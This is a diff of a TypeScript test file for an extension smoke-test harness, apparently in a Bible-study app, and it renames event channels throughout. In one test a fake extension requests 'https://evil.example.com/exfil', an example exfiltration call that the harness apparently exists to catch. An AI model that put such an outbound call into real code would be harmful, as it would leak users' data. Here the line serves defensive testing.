@@ -384,16 +384,16 @@ describe('createRealmSmokeHarness — API routing', () => {
 describe('createRealmSmokeHarness — events', () => {
   const subscribing: FakeGuest = {
     onInit(ops) {
-      ops.subscribe('bible.onDidChangeActiveVerse');
+      ops.subscribe('verse.activeChanged');
     },
   };
 
   it('turns a subscribe envelope into an enumerable hook', async () => {
     const { harness } = harnessFor(subscribing);
     await harness.activate();
-    expect(harness.subscribedChannels()).toEqual(['bible.onDidChangeActiveVerse']);
+    expect(harness.subscribedChannels()).toEqual(['verse.activeChanged']);
     expect(harness.enumerate().map((h) => h.hookId)).toContain(
-      'event:bible.onDidChangeActiveVerse',
+      'event:verse.activeChanged',
     );
   });
 
@@ -407,7 +407,7 @@ describe('createRealmSmokeHarness — events', () => {
     });
     await harness.activate();
     const result = await harness.invokeHook(
-      'event:bible.onDidChangeActiveVerse',
+      'event:verse.activeChanged',
       { verseId: 43003016 },
     );
     expect(result.status).toBe('ok');
@@ -422,7 +422,7 @@ describe('createRealmSmokeHarness — events', () => {
       },
     });
     await harness.activate();
-    const result = await harness.invokeHook('event:bible.onDidChangeActiveVerse', {});
+    const result = await harness.invokeHook('event:verse.activeChanged', {});
     expect(result.status).toBe('threw');
     expect(result.error?.message).toMatch(/handler exploded/);
     expect(harness.runtimeErrors()).toHaveLength(1);
@@ -431,40 +431,40 @@ describe('createRealmSmokeHarness — events', () => {
   it('does not blame an invocation for an error raised before it', async () => {
     const { harness } = harnessFor({
       onInit(ops) {
-        ops.subscribe('bible.onDidChangeActiveVerse');
+        ops.subscribe('verse.activeChanged');
         ops.raise('noise during activate');
       },
     });
     await harness.activate();
     expect(harness.runtimeErrors()).toHaveLength(1);
-    const result = await harness.invokeHook('event:bible.onDidChangeActiveVerse', {});
+    const result = await harness.invokeHook('event:verse.activeChanged', {});
     expect(result.status).toBe('ok');
   });
 
   it('drops the subscriber when the guest unsubscribes', async () => {
     const { harness } = harnessFor({
       onInit(ops) {
-        const id = ops.subscribe('bible.onDidChangeActiveVerse');
-        ops.subscribe('notes.onDidChange');
+        const id = ops.subscribe('verse.activeChanged');
+        ops.subscribe('notes.changed');
         ops.unsubscribe(id);
       },
     });
     await harness.activate();
     expect([...harness.getCaptured().eventSubscribers.keys()]).toEqual([
-      'notes.onDidChange',
+      'notes.changed',
     ]);
   });
 
   it('keeps the channel alive while another subscription still holds it', async () => {
     const { harness } = harnessFor({
       onInit(ops) {
-        const first = ops.subscribe('bible.onDidChangeActiveVerse');
-        ops.subscribe('bible.onDidChangeActiveVerse');
+        const first = ops.subscribe('verse.activeChanged');
+        ops.subscribe('verse.activeChanged');
         ops.unsubscribe(first);
       },
     });
     await harness.activate();
-    expect(harness.getCaptured().eventSubscribers.has('bible.onDidChangeActiveVerse')).toBe(
+    expect(harness.getCaptured().eventSubscribers.has('verse.activeChanged')).toBe(
       true,
     );
   });
@@ -476,7 +476,7 @@ describe('runSmokeSuite over a realm-backed harness', () => {
   it('passes a clean extension', async () => {
     const { harness } = harnessFor({
       onInit(ops) {
-        ops.subscribe('bible.onDidChangeActiveVerse');
+        ops.subscribe('verse.activeChanged');
       },
       onEvent() {
         /* well-behaved */
@@ -491,7 +491,7 @@ describe('runSmokeSuite over a realm-backed harness', () => {
   it('flags a permission the manifest never declared', async () => {
     const { harness } = harnessFor({
       onInit(ops) {
-        ops.subscribe('bible.onDidChangeActiveVerse');
+        ops.subscribe('verse.activeChanged');
       },
       async onEvent(_channel, _payload, ops) {
         await ops.request('notes.create', [{ content: 'nope' }]);
@@ -508,7 +508,7 @@ describe('runSmokeSuite over a realm-backed harness', () => {
     const { harness } = harnessFor(
       {
         onInit(ops) {
-          ops.subscribe('bible.onDidChangeActiveVerse');
+          ops.subscribe('verse.activeChanged');
         },
         async onEvent(_channel, _payload, ops) {
           await ops.request('network.fetch', ['https://evil.example.com/exfil']);
@@ -609,7 +609,7 @@ describe('createRealmSmokeHarness — lifecycle', () => {
     const order: string[] = [];
     const { harness } = harnessFor({
       onInit(ops) {
-        ops.subscribe('bible.onDidChangeActiveVerse');
+        ops.subscribe('verse.activeChanged');
       },
       onDeactivate(ops) {
         order.push('guest-deactivate');
